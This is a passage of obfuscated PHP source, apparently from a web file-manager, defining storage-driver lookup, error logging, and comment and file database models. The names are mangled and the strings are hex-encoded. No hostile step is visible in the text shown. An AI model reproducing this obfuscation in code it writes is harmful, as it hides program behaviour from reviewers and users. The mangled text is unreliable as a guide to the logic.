* 10) { throw new Exception("\x66\151\154\145\122\145\x61\144\40\145\162\x72\x6f\x72\41\40\163\164\141\x72\x74\x3d{$ºÊ›¥Ø¦}\73\x6c\145\156\147\164\150\x3d{$€í†êéü}\73\40\163\151\172\x65\x3d{$Ô’ˆí}\73"); } $¦Ëà‘ö» = $øØ’Õ™¢->fileSubstr($®ãÅûÄ, $ºÊ›¥Ø¦, $€í†êéü); if (!$¦Ëà‘ö» && $€í†êéü && isset($GLOBALS[$ÁäŒŠ¨Ğ[1161]])) { throw new Exception($GLOBALS[$ÁäŒŠ¨Ğ[1161]][$ÁäŒŠ¨Ğ[1162]]); } return $¦Ëà‘ö»; } private static function driverMake(&$Åí Ô¸) { $ºæš´ıÏ =& $_SERVER[Ãìšã«™]; $êüó ğô = KodIO::parse($Åí Ô¸); if (!self::$driverListSystem) { $÷ç¼Ü¤‹ = Model($ºæš´ıÏ[768])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($÷ç¼Ü¤‹, $ºæš´ıÏ[392]); } if ($êüó ğô[$ºæš´ıÏ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$êüó ğô[$ºæš´ıÏ[392]]]) { return !1; } $Åí Ô¸ = $êüó ğô[$ºæš´ıÏ[1163]]; $†›ÙŸ² = self::driverGet($êüó ğô, $Åí Ô¸); return $†›ÙŸ²; } private static function driverGet($´®Œ§¿‰, &$œï“±ı‡) { $¸ÁöÃ =& $_SERVER[Ãìšã«™]; $¸¾ö¦¾â = $´®Œ§¿‰[$¸ÁöÃ[1164]]; $ÀñŠñ¶¿ = $´®Œ§¿‰[$¸ÁöÃ[392]]; switch ($´®Œ§¿‰[$¸ÁöÃ[33]]) { case KodIO::KOD_IO: $ÈäàÜ»¡ = self::$driverListSystem[$ÀñŠñ¶¿]; break; case KodIO::KOD_SOURCE: $œï“±ı‡ = $ÀñŠñ¶¿ . $œï“±ı‡; $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1166], $¸ÁöÃ[6] => $´®Œ§¿‰); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $âúÕÕ° = $GLOBALS[$¸ÁöÃ[1167]]; self::$driverListUser = array_to_keyvalue($âúÕÕ°, $¸ÁöÃ[392]); } $ÈäàÜ»¡ = self::$driverListUser[$ÀñŠñ¶¿]; break; case KodIO::KOD_SHARE_LINK: $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1168], $¸ÁöÃ[6] => $´®Œ§¿‰); $·±Ö»ğÍ = Action($¸ÁöÃ[1169])->sharePathInfo($´®Œ§¿‰[$¸ÁöÃ[78]]); $œï“±ı‡ = $·±Ö»ğÍ[$¸ÁöÃ[403]]; if (!$·±Ö»ğÍ[$¸ÁöÃ[403]]) { $¥¦Ë©î² = Model($¸ÁöÃ[595])->getInfo($·±Ö»ğÍ[$¸ÁöÃ[488]]); $œï“±ı‡ = KodIO::clear($¥¦Ë©î²[$¸ÁöÃ[1170]] . $´®Œ§¿‰[$¸ÁöÃ[1163]]); $´®Œ§¿‰[$¸ÁöÃ[486]] = $¥¦Ë©î²; $´®Œ§¿‰[$¸ÁöÃ[1147]] = $œï“±ı‡; $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1171], $¸ÁöÃ[6] => $´®Œ§¿‰); } break; case KodIO::KOD_SHARE_ITEM: $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1172], $¸ÁöÃ[6] => $´®Œ§¿‰); $¥¦Ë©î² = Model($¸ÁöÃ[595])->getInfo($´®Œ§¿‰[$¸ÁöÃ[392]]); if ($¥¦Ë©î²[$¸ÁöÃ[403]] == $¸ÁöÃ[190]) { $œï“±ı‡ = KodIO::clear($¥¦Ë©î²[$¸ÁöÃ[1170]] . $´®Œ§¿‰[$¸ÁöÃ[1163]]); $´®Œ§¿‰[$¸ÁöÃ[486]] = $¥¦Ë©î²; $´®Œ§¿‰[$¸ÁöÃ[1147]] = $œï“±ı‡; $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1173], $¸ÁöÃ[6] => $´®Œ§¿‰); } else { if (!$œï“±ı‡) { $œï“±ı‡ = $¥¦Ë©î²[$¸ÁöÃ[403]]; } } break; default: $œï“±ı‡ = $´®Œ§¿‰[$¸ÁöÃ[78]]; $ÈäàÜ»¡ = array($¸ÁöÃ[1165] => $¸ÁöÃ[1174]); break; } $‹û˜—ıµ = $´®Œ§¿‰[$¸ÁöÃ[78]]; if (!isset(self::$driverCache[$‹û˜—ıµ])) { $Ç™ö·£ß = strtolower($ÈäàÜ»¡[$¸ÁöÃ[96]]); $‰Ş¿© = $GLOBALS[$¸ÁöÃ[6]][$¸ÁöÃ[90]][$¸ÁöÃ[827]]; $“Á¬÷şŞ = $¸ÁöÃ[74] . (isset($‰Ş¿©[$Ç™ö·£ß]) ? $‰Ş¿©[$Ç™ö·£ß] : ucfirst($Ç™ö·£ß)); if (!class_exists($“Á¬÷şŞ)) { show_json("{$“Á¬÷şŞ}\x20\x6e\x6f\164\40\x65\x78\151\x73\x74\163\x21", !1); } $ÀŸ«§êŠ = isset($ÈäàÜ»¡[$¸ÁöÃ[6]]) ? $ÈäàÜ»¡[$¸ÁöÃ[6]] : !1; self::$driverCache[$‹û˜—ıµ] = new $“Á¬÷şŞ($ÀŸ«§êŠ); } $‹–š×£„ = self::$driverCache[$‹û˜—ıµ]; $‹–š×£„->pathDriver = $¸¾ö¦¾â; $‹–š×£„->pathBase = $¸ÁöÃ[12]; if (isset($ÈäàÜ»¡[$¸ÁöÃ[6]][$¸ÁöÃ[1175]])) { $‹–š×£„->pathBase = rtrim($ÈäàÜ»¡[$¸ÁöÃ[6]][$¸ÁöÃ[1175]], $¸ÁöÃ[8]) . $¸ÁöÃ[8]; $œï“±ı‡ = $‹–š×£„->pathBase . ltrim($œï“±ı‡, $¸ÁöÃ[8]); } $œï“±ı‡ = $‹–š×£„->getPath($œï“±ı‡); if (isset($´®Œ§¿‰[$¸ÁöÃ[1147]])) { $œï“±ı‡ = $´®Œ§¿‰[$¸ÁöÃ[1147]]; } $‹–š×£„->path = $œï“±ı‡; return $‹–š×£„; } public static function errorTips($èåâ¦»Ê = false) { $¹ß°¯ =& $_SERVER[Ãìšã«™]; static $¹Å¡Ã†¶ = array(); $–¿ ¯âÊ = 1000; if ($èåâ¦»Ê === -1) { return $¹Å¡Ã†¶ ? $¹Å¡Ã†¶[count($¹Å¡Ã†¶) - 1] : $¹ß°¯[12]; } if ($èåâ¦»Ê === !1) { return implode($¹ß°¯[226], $¹Å¡Ã†¶); } if (count($¹Å¡Ã†¶) >= $–¿ ¯âÊ) { $¹Å¡Ã†¶ = array_slice($¹Å¡Ã†¶, $–¿ ¯âÊ * 0.5, $–¿ ¯âÊ); } $¹Å¡Ã†¶[] = $èåâ¦»Ê; write_log($¹ß°¯[159] . ACTION . $¹ß°¯[1176] . $èåâ¦»Ê, $¹ß°¯[1177]); } public static function getLastError($ÄòÆ„† = '') { $½“çßßƒ = self::errorTips(-1); return $½“çßßƒ ? $½“çßßƒ : $ÄòÆ„†; } } goto AÚ­ŒŞšÁñ; C‚ÇÍ˜—ƒê: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\x65" => "\x63\x6f\x6d\155\x65\x6e\164\x5f\x6d\145\164\141", "\155\145\164\x61\106\x69\145\154\x64" => "\143\157\155\155\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($•µÁ¯ÜÉ) { $œ°ŸßğÖ =& $_SERVER[Ãìšã«™]; if ($•µÁ¯ÜÉ[$œ°ŸßğÖ[1846]]) { $‘ú¬ïüö = $this->where(array($œ°ŸßğÖ[1847] => $•µÁ¯ÜÉ[$œ°ŸßğÖ[1846]]))->find(); if (!$‘ú¬ïüö || $‘ú¬ïüö[$œ°ŸßğÖ[412]] != $•µÁ¯ÜÉ[$œ°ŸßğÖ[412]] || $‘ú¬ïüö[$œ°ŸßğÖ[504]] != $•µÁ¯ÜÉ[$œ°ŸßğÖ[504]]) { return !1; } $this->where(array($œ°ŸßğÖ[1847] => $•µÁ¯ÜÉ[$œ°ŸßğÖ[1846]]))->setAdd($œ°ŸßğÖ[1848], 1); } $•µÁ¯ÜÉ[$œ°ŸßğÖ[1849]] = 0; $•µÁ¯ÜÉ[$œ°ŸßğÖ[1848]] = 0; $•µÁ¯ÜÉ[$œ°ŸßğÖ[751]] = 1; return $this->add($•µÁ¯ÜÉ); } public function commentCount($ ÍÍŸÁû, $ÌÆôüæš, $ùÑ’³´ı = false) { $ş…ø²€´ =& $_SERVER[Ãìšã«™]; if (!$ ÍÍŸÁû) { return array(); } if (is_string($ ÍÍŸÁû) || is_int($ ÍÍŸÁû)) { $ ÍÍŸÁû = array($ ÍÍŸÁû); } $÷‡†€ä = array($ş…ø²€´[504], $ş…ø²€´[1850] => $ş…ø²€´[500]); $ëşÃØ™ø = array($ş…ø²€´[504] => array($ş…ø²€´[7], $ ÍÍŸÁû), $ş…ø²€´[412] => $ÌÆôüæš); if ($ùÑ’³´ı) { $ëşÃØ™ø[$ş…ø²€´[1650]] = $ùÑ’³´ı; } $’é­á = $this->field($÷‡†€ä)->where($ëşÃØ™ø)->group($ş…ø²€´[504])->select(); return array_to_keyvalue($’é­á, $ş…ø²€´[504], $ş…ø²€´[500]); } public function starTarget($÷™üõßò, $¢ù»¢ÚÄ) { $åæÙÅìõ =& $_SERVER[Ãìšã«™]; $ûµíğå = $÷™üõßò + self::TYPE_STAR_OFFSET; $ÅŸÁç¿ = array($åæÙÅìõ[1650] => USER_ID, $åæÙÅìõ[412] => $ûµíğå, $åæÙÅìõ[504] => $¢ù»¢ÚÄ); $³¡´©Úô = $this->where($ÅŸÁç¿)->find(); if ($³¡´©Úô) { return $this->where(array($åæÙÅìõ[392] => $³¡´©Úô[$åæÙÅìõ[392]]))->delete(); } $¦‚ãŞÉ« = array($åæÙÅìõ[1846] => 0, $åæÙÅìõ[1650] => USER_ID, $åæÙÅìõ[751] => 1, $åæÙÅìõ[756] => $åæÙÅìõ[12], $åæÙÅìõ[412] => $ûµíğå, $åæÙÅìõ[504] => $¢ù»¢ÚÄ, $åæÙÅìõ[1849] => 0, $åæÙÅìõ[1848] => 0); return $this->add($¦‚ãŞÉ«); } public function starTargetCount($ùÑ·Ñô, $ÙÂ‘†ı’) { $æñæĞ¬ =& $_SERVER[Ãìšã«™]; $·›û—‹ = $ÙÂ‘†ı’ + self::TYPE_STAR_OFFSET; $ƒÑ‘‚ … = $this->commentCount($ùÑ·Ñô, $·›û—‹); $£¨È’¨É = $this->commentCount($ùÑ·Ñô, $·›û—‹, USER_ID); return array($æñæĞ¬[1851] => $ƒÑ‘‚ …, $æñæĞ¬[1852] => $£¨È’¨É); } public function starTargetUserList($¬ÔİŸü, $ôœ¥èó‹) { $Ç¤¶´Íˆ =& $_SERVER[Ãìšã«™]; $€ÓÇöí‚ = $¬ÔİŸü + self::TYPE_STAR_OFFSET; $¹´¼ ßç = array($Ç¤¶´Íˆ[504] => $ôœ¥èó‹, $Ç¤¶´Íˆ[412] => $€ÓÇöí‚); $ñıŠÎ = $this->where($¹´¼ ßç)->count(); $·©×ë¤‡ = array($Ç¤¶´Íˆ[250] => $ñıŠÎ, $Ç¤¶´Íˆ[1853] => array()); if (!$ñıŠÎ) { return $·©×ë¤‡; } $»¤Æø = $this->field($Ç¤¶´Íˆ[1650])->where($¹´¼ ßç)->limit(500)->select(); $»¤Æø = array_to_keyvalue($»¤Æø, $Ç¤¶´Íˆ[12], $Ç¤¶´Íˆ[1650]); $·©×ë¤‡[$Ç¤¶´Íˆ[1853]] = Model($Ç¤¶´Íˆ[513])->userListInfo($»¤Æø); return $·©×ë¤‡; } public function prasiseUserList($±™¦üÆ) { $ÀÁÖ·¤ã =& $_SERVER[Ãìšã«™]; $òˆÃ—ï× = array($ÀÁÖ·¤ã[1854] => $±™¦üÆ); $Œ„’›—ğ = $this->where($òˆÃ—ï×)->find(); $˜÷‰¨Åä = _get($Œ„’›—ğ, $ÀÁÖ·¤ã[1849], 0); $…æ¬”ùÅ = array($ÀÁÖ·¤ã[250] => $˜÷‰¨Åä, $ÀÁÖ·¤ã[1853] => array()); if (!$˜÷‰¨Åä) { return $…æ¬”ùÅ; } $¤ßñãƒ = Model($ÀÁÖ·¤ã[1855])->field($ÀÁÖ·¤ã[1650])->where($òˆÃ—ï×)->limit(500)->select(); $¤ßñãƒ = array_to_keyvalue($¤ßñãƒ, $ÀÁÖ·¤ã[12], $ÀÁÖ·¤ã[1650]); $…æ¬”ùÅ[$ÀÁÖ·¤ã[1853]] = Model($ÀÁÖ·¤ã[513])->userListInfo($¤ßñãƒ); return $…æ¬”ùÅ; } public function remove($ªºŸ±ğ«) { $‰ÄŠŸ° =& $_SERVER[Ãìšã«™]; $•ÕäÙ£Õ = array($‰ÄŠŸ°[1847] => $ªºŸ±ğ«); $÷¶ÂÌø = $this->where($•ÕäÙ£Õ)->find(); if ($÷¶ÂÌø[$‰ÄŠŸ°[1846]]) { $this->where(array($‰ÄŠŸ°[1847] => $÷¶ÂÌø[$‰ÄŠŸ°[1846]]))->setAdd($‰ÄŠŸ°[1848], -1); } return $this->where($•ÕäÙ£Õ)->delete(); } public function edit($¬å§ÈÇ–, $Ç˜õÃÔ¹) { $®ØŞ®šÁ =& $_SERVER[Ãìšã«™]; $Í¨åèŠ· = array($®ØŞ®šÁ[1847] => $¬å§ÈÇ–); return $this->where($Í¨åèŠ·)->save(array($®ØŞ®šÁ[1856] => $Ç˜õÃÔ¹)); } public function prasise($¼ÖÒöÀœ) { $çäò³’¢ =& $_SERVER[Ãìšã«™]; $È®ƒìÚš = Model($çäò³’¢[1857]); $Òİ”èÓ† = array($çäò³’¢[1847] => $¼ÖÒöÀœ, $çäò³’¢[1641] => USER_ID); $²ÂÎß®À = $È®ƒìÚš->where($Òİ”èÓ†)->find(); if (!$²ÂÎß®À) { $È®ƒìÚš->add($Òİ”èÓ†); $í©ì¬” = $this->where(array($çäò³’¢[1847] => $¼ÖÒöÀœ))->setAdd($çäò³’¢[1849], 1); } else { $È®ƒìÚš->where($Òİ”èÓ†)->delete(); $í©ì¬” = $this->where(array($çäò³’¢[1847] => $¼ÖÒöÀœ))->setAdd($çäò³’¢[1849], -1); } return $í©ì¬”; } public function targetInfo($‹çª¥¶œ, $ÓåÓ¬Ü¸) { $¨£‡ÜÉ† =& $_SERVER[Ãìšã«™]; $™­æÃŒ = array($¨£‡ÜÉ†[580] => $‹çª¥¶œ, $¨£‡ÜÉ†[581] => $ÓåÓ¬Ü¸); $Ş˜˜×éÖ = $this->where($™­æÃŒ)->count(); $îÊÊå‰ = "\122\111\x47\x48\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\x74\x5f\x70\x72\x61\151\x73\145\x20\x73\x74\x61\x72\x20\157\156\40\x63\157\x6d\155\x65\156\164\56\143\x6f\x6d\x6d\x65\156\x74\111\104\x20\75\40\x73\164\x61\162\x2e\x63\157\155\x6d\145\x6e\164\x49\x44"; $Ãœçª˜± = $this->alias($¨£‡ÜÉ†[349])->where($™­æÃŒ)->join($îÊÊå‰, $¨£‡ÜÉ†[1858])->count(); $úïÂ•½´ = array($¨£‡ÜÉ†[1859] => $Ş˜˜×éÖ, $¨£‡ÜÉ†[1860] => $Ãœçª˜±); return $úïÂ•½´; } public function listData($ªù™‚•ª) { $ôˆ™‹Ãß =& $_SERVER[Ãìšã«™]; if (isset($ªù™‚•ª[$ôˆ™‹Ãß[1861]])) { if ($ªù™‚•ª[$ôˆ™‹Ãß[1861]]) { $ªù™‚•ª[$ôˆ™‹Ãß[1854]] = array($ôˆ™‹Ãß[1010], intval($ªù™‚•ª[$ôˆ™‹Ãß[1861]])); } unset($ªù™‚•ª[$ôˆ™‹Ãß[1861]]); } if (isset($ªù™‚•ª[$ôˆ™‹Ãß[1862]])) { if ($ªù™‚•ª[$ôˆ™‹Ãß[1862]]) { $ªù™‚•ª[$ôˆ™‹Ãß[1854]] = array($ôˆ™‹Ãß[1007], intval($ªù™‚•ª[$ôˆ™‹Ãß[1862]])); } unset($ªù™‚•ª[$ôˆ™‹Ãß[1862]]); } return $this->_listData($ªù™‚•ª); } private function _listData($œ•Œö×Ë) { $š¬Áõ¢Ú =& $_SERVER[Ãìšã«™]; $°şÎèÙŠ = $this->where($œ•Œö×Ë)->_makeOrder()->selectPage(100); $this->_listAppendParent($°şÎèÙŠ[$š¬Áõ¢Ú[364]]); $this->_listAppendUser($°şÎèÙŠ[$š¬Áõ¢Ú[364]]); $this->_listAppendMeta($°şÎèÙŠ[$š¬Áõ¢Ú[364]]); return $°şÎèÙŠ; } private function _makeOrder() { $Õ¸¨ƒòà =& $_SERVER[Ãìšã«™]; $“ÕºÖ”Š = array($Õ¸¨ƒòà[1849], $Õ¸¨ƒòà[1848], $Õ¸¨ƒòà[193]); $ğ ‘çÆ = Input::get($Õ¸¨ƒòà[455], $Õ¸¨ƒòà[7], $Õ¸¨ƒòà[424], $“ÕºÖ”Š); $ÂŠúÓü = Input::get($Õ¸¨ƒòà[456], $Õ¸¨ƒòà[7], $Õ¸¨ƒòà[1643], array($Õ¸¨ƒòà[1863], $Õ¸¨ƒòà[451])); $ùş®•õ˜ = $ğ ‘çÆ . $Õ¸¨ƒòà[53] . $ÂŠúÓü; return $this->order($ùş®•õ˜); } private function _listAppendParent(&$ÖÆ§±ï¿) { $ÓïåÉ—ñ =& $_SERVER[Ãìšã«™]; $†ãÈé’ = array_unique(array_to_keyvalue($ÖÆ§±ï¿, $ÓïåÉ—ñ[12], $ÓïåÉ—ñ[1846])); $†ãÈé’ = array_remove_value($†ãÈé’, $ÓïåÉ—ñ[190]); if (!$†ãÈé’) { return; } $”øä °ï = $this->where(array($ÓïåÉ—ñ[1847] => array($ÓïåÉ—ñ[7], $†ãÈé’)))->select(); $”øä °ï = array_to_keyvalue($”øä °ï, $ÓïåÉ—ñ[1854]); foreach ($ÖÆ§±ï¿ as &$¨ü…ñÚ¦) { if (isset($”øä °ï[$¨ü…ñÚ¦[$ÓïåÉ—ñ[1846]]])) { $¨ü…ñÚ¦[$ÓïåÉ—ñ[1864]] = $”øä °ï[$¨ü…ñÚ¦[$ÓïåÉ—ñ[1846]]]; } } unset($¨ü…ñÚ¦); } private function _listAppendUser(&$©ôª…â•) { $ ‰Ë£äº =& $_SERVER[Ãìšã«™]; $´•‘ºŞ¬ = array_unique(array_to_keyvalue($©ôª…â•, $ ‰Ë£äº[12], $ ‰Ë£äº[1650])); $´•‘ºŞ¬ = array_remove_value($´•‘ºŞ¬, $ ‰Ë£äº[190]); if (count($´•‘ºŞ¬) == 0) { return; } foreach ($©ôª…â• as $ƒáè…â‰) { if (isset($ƒáè…â‰[$ ‰Ë£äº[1864]])) { $´•‘ºŞ¬[] = $ƒáè…â‰[$ ‰Ë£äº[1864]][$ ‰Ë£äº[1650]]; } } $Áî˜€¬— = Model($ ‰Ë£äº[538])->userListInfo($´•‘ºŞ¬); foreach ($©ôª…â• as &$ƒáè…â‰) { $ƒáè…â‰[$ ‰Ë£äº[594]] = $Áî˜€¬—[$ƒáè…â‰[$ ‰Ë£äº[1650]]]; if (isset($ƒáè…â‰[$ ‰Ë£äº[1864]])) { $ƒáè…â‰[$ ‰Ë£äº[1864]][$ ‰Ë£äº[594]] = $Áî˜€¬—[$ƒáè…â‰[$ ‰Ë£äº[1864]][$ ‰Ë£äº[1650]]]; } } unset($ƒáè…â‰); } private function _listAppendMeta(&$¦Ûµâí¾) { $ƒ÷Ğ”ó =& $_SERVER[Ãìšã«™]; $ÔÆ…ÈÚË = array_unique(array_to_keyvalue($¦Ûµâí¾, $ƒ÷Ğ”ó[12], $ƒ÷Ğ”ó[1854])); $ÔÆ…ÈÚË = array_remove_value($ÔÆ…ÈÚË, $ƒ÷Ğ”ó[190]); if (!$ÔÆ…ÈÚË) { return; } foreach ($¦Ûµâí¾ as $ê¾ŞÈ£Ø) { if (isset($ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1864]])) { $ÔÆ…ÈÚË[] = $ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1864]][$ƒ÷Ğ”ó[1854]]; } } $²å¡¸Ÿ· = $this->metaList($ÔÆ…ÈÚË); if (!$²å¡¸Ÿ·) { return !1; } foreach ($¦Ûµâí¾ as &$ê¾ŞÈ£Ø) { $ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[465]] = $²å¡¸Ÿ·[$ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1854]]]; if (isset($ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1864]])) { $ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1864]][$ƒ÷Ğ”ó[465]] = $²å¡¸Ÿ·[$ê¾ŞÈ£Ø[$ƒ÷Ğ”ó[1864]][$ƒ÷Ğ”ó[1854]]]; } } unset($ê¾ŞÈ£Ø); } private function metaList($Ûç†×¾ô) { $‚›€ß¨® =& $_SERVER[Ãìšã«™]; if (!$Ûç†×¾ô) { return array(); } $ÕëÒ§ì = array($‚›€ß¨®[1854] => array($‚›€ß¨®[7], $Ûç†×¾ô)); $¯ÛÕï¤Å = Model($‚›€ß¨®[1865])->where($ÕëÒ§ì)->select(); $¯ÛÕï¤Å = array_to_keyvalue_group($¯ÛÕï¤Å, $‚›€ß¨®[1854]); foreach ($¯ÛÕï¤Å as $¯áµ‡‘ => $ëì’²â‘) { $à²êêà³ = array(); foreach ($ëì’²â‘ as $´’ùÔø) { $à²êêà³[$´’ùÔø[$‚›€ß¨®[95]]] = $´’ùÔø[$‚›€ß¨®[369]]; } $¯ÛÕï¤Å[$¯áµ‡‘] = $à²êêà³; } return $¯ÛÕï¤Å ? $¯ÛÕï¤Å : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\x6c\x65\x5f\x63\157\156\x74\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\165\156\143\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\x65" => "\151\157\137\146\151\x6c\x65\x5f\155\145\x74\x61", "\155\145\x74\x61\106\151\x65\x6c\144" => "\x66\151\x6c\145\x49\x44"); public function fileInfo($í®Ÿï€®) { $Å»úØïÒ =& $_SERVER[Ãìšã«™]; static $Í”Ù«ó = array(); if (!isset($Í”Ù«ó[$í®Ÿï€®])) { $­†ñĞÁ‰ = $Å»úØïÒ[1866]; $ Çñ„Á´ = Model($Å»úØïÒ[470])->field($­†ñĞÁ‰)->where(array($Å»úØïÒ[468] => $í®Ÿï€®))->find(); $Í”Ù«ó[$í®Ÿï€®] = $ Çñ„Á´; } return $Í”Ù«ó[$í®Ÿï€®]; } public function addFileByContent($¥ß‡€ = '', $ïªºß—¨ = '') { $™Â¥Ú¬ =& $_SERVER[Ãìšã«™]; $µœÖà‘ = TEMP_PATH . $™Â¥Ú¬[1867]; if (!is_dir($µœÖà‘)) { mk_dir($µœÖà‘); } $ÃØË›…í = $µœÖà‘ . $™Â¥Ú¬[1868] . rand_string(16); file_put_contents($ÃØË›…í, $¥ß‡€); $£Õ®ÈÃ« = $this->addFile($ÃØË›…í, $ïªºß—¨, !0); if (file_exists($ÃØË›…í)) { @unlink($ÃØË›…í); } return $£Õ®ÈÃ«; } public function createFileName($ª È¸¥Ö, $Æå×Š£÷ = false, $—­Ã¹ÍÆ = false) { $¬¸üªÉ =& $_SERVER[Ãìšã«™]; $ÙõÆŠŠ² = IO::init($¬¸üªÉ[8]); $ÁÓ¥æ¾Ë = $this->makeFilePath($ª È¸¥Ö, $ÙõÆŠŠ², $Æå×Š£÷, $—­Ã¹ÍÆ); $ÒÄóš´ğ = $ÙõÆŠŠ²->pathFather($ÁÓ¥æ¾Ë); static $âåƒËòè = false; $ÕÙƒ »£ = $¬¸üªÉ[1869] . md5($ÒÄóš´ğ); if (!$âåƒËòè && !Cache::get($ÕÙƒ »£)) { $âåƒËòè = !0; $²®°°¡ = IO::mkdir($ÒÄóš´ğ); if (!IO::exist($²®°°¡ . $¬¸üªÉ[798])) { IO::mkfile($²®°°¡ . $¬¸üªÉ[798]); } Cache::set($ÕÙƒ »£, 1, 3600 * 2); } return $ÁÓ¥æ¾Ë; } public function makeFilePath($‡éõ‹ëÑ, $°ƒ†ÑÙ–, $³µìÕí° = false, $ºÙ»ŠÜø = false) { $î£î²Çù =& $_SERVER[Ãìšã«™]; $¿ÔÊç¥á = Model($î£î²Çù[771])->get($î£î²Çù[1870]); $Ìêá™ÑÌ = KodIO::defaultIO() . date($î£î²Çù[1871]); $‚Û™†Â = $Ìêá™ÑÌ . rand_string(5) . short_id(100); $‡éõ‹ëÑ = str_replace($î£î²Çù[8], $î£î²Çù[11], KodIO::clear($‡éõ‹ëÑ)); $æöñ®„» = $°ƒ†ÑÙ–->ext($‡éõ‹ëÑ); if (!$‡éõ‹ëÑ) { $¿ÔÊç¥á = $î£î²Çù[1872]; } switch ($¿ÔÊç¥á) { case $î£î²Çù[1873]: $‚Û™†Â = $‚Û™†Â . $î£î²Çù[10] . $°ƒ†ÑÙ–->ext($‡éõ‹ëÑ); if ($æöñ®„» == $î£î²Çù[1811]) { $‚Û™†Â .= $î£î²Çù[1544]; } break; case $î£î²Çù[1874]: $çõû÷ïİ = Model($î£î²Çù[771])->get($î£î²Çù[772]); $Î‚ø‡” = substr(md5($î£î²Çù[773] . $çõû÷ïİ . date($î£î²Çù[749])), 0, 8); $îá¦¸Ç× = KodIO::defaultDriver(); $Ìêá™ÑÌ = $î£î²Çù[1223] . $îá¦¸Ç×[$î£î²Çù[392]] . $î£î²Çù[410] . date($î£î²Çù[1875]) . $Î‚ø‡” . $î£î²Çù[8]; if ($æöñ®„» == $î£î²Çù[1811]) { $‡éõ‹ëÑ .= $î£î²Çù[1544]; } $Î´›¢‚ü = $î£î²Çù[1876] . $Ìêá™ÑÌ . $‡éõ‹ëÑ; CacheLock::lock($Î´›¢‚ü); $‚Û™†Â = $Ìêá™ÑÌ . $‡éõ‹ëÑ; if (IO::exist($Ìêá™ÑÌ . $‡éõ‹ëÑ)) { $²ˆ¥ìÍ¢ = substr($‡éõ‹ëÑ, 0, strlen($‡éõ‹ëÑ) - strlen($æöñ®„»)); $Ú¥±Î¶œ = $ºÙ»ŠÜø ? substr($ºÙ»ŠÜø, 0, 5) : ($³µìÕí° ? substr($³µìÕí°, 0, 5) : rand_string(5)); $‚Û™†Â = $Ìêá™ÑÌ . $²ˆ¥ìÍ¢ . $Ú¥±Î¶œ . $î£î²Çù[10] . $æöñ®„»; } if (IO::isTypeObject($‚Û™†Â) && !IO::isUploadServer($‚Û™†Â)) { if (IO::exist($‚Û™†Â)) { return $‚Û™†Â; } $»¹òâ¹ = IO::setContent($‚Û™†Â, $î£î²Çù[12]); if (!$»¹òâ¹) { show_json($î£î²Çù[1877], !1); } } CacheLock::unlock($Î´›¢‚ü); break; case $î£î²Çù[1872]: break; default: break; } return $‚Û™†Â; } public function addFileByRemote($ê×€±¬, $ñò£Œá‘, $ïş…ûÃ© = array()) { $¦­ñŸ˜è =& $_SERVER[Ãìšã«™]; if (!IO::exist($ê×€±¬)) { return !1; } $­ğÖ°Æí = $ïş…ûÃ©[$¦­ñŸ˜è[169]] ? $ïş…ûÃ©[$¦­ñŸ˜è[169]] : $¦­ñŸ˜è[12]; $±ƒŒáÊÊ = IO::hashMd5($ê×€±¬, $­ğÖ°Æí); $ı€íÓ ‹ = KodIO::defaultDriver(); $¢Äü÷¤ = array($¦­ñŸ˜è[579] => IO::size($ê×€±¬), $¦­ñŸ˜è[1878] => 1, $¦­ñŸ˜è[421] => $ñò£Œá‘, $¦­ñŸ˜è[809] => $ı€íÓ ‹[$¦­ñŸ˜è[392]], $¦­ñŸ˜è[422] => $ê×€±¬, $¦­ñŸ˜è[1879] => $ïş…ûÃ©[$¦­ñŸ˜è[170]] ? $ïş…ûÃ©[$¦­ñŸ˜è[170]] : IO::hashSimple($ê×€±¬), $¦­ñŸ˜è[1880] => $±ƒŒáÊÊ ? $±ƒŒáÊÊ : $­ğÖ°Æí); if ($ÂÒ­¾úú = $this->addFileCheckExist($¢Äü÷¤[$¦­ñŸ˜è[170]], $¢Äü÷¤[$¦­ñŸ˜è[169]], $¢Äü÷¤[$¦­ñŸ˜è[80]])) { return $ÂÒ­¾úú; } return $this->addFileData($¢Äü÷¤); } private function addFileData($ÑÊÎÁ–) { $À­İÄêÜ =& $_SERVER[Ãìšã«™]; if (!$ÑÊÎÁ–) { return !1; } $ÑÊÎÁ–[$À­İÄêÜ[80]] = intval($ÑÊÎÁ–[$À­İÄêÜ[80]]); if (!$ÑÊÎÁ–[$À­İÄêÜ[80]] && strlen($ÑÊÎÁ–[$À­İÄêÜ[170]]) > 32) { $ÑÊÎÁ–[$À­İÄêÜ[80]] = intval(substr($ÑÊÎÁ–[$À­İÄêÜ[170]], 32)); } $÷û”ŠƒÅ = $this->add($ÑÊÎÁ–); return $this->find($÷û”ŠƒÅ); } public function 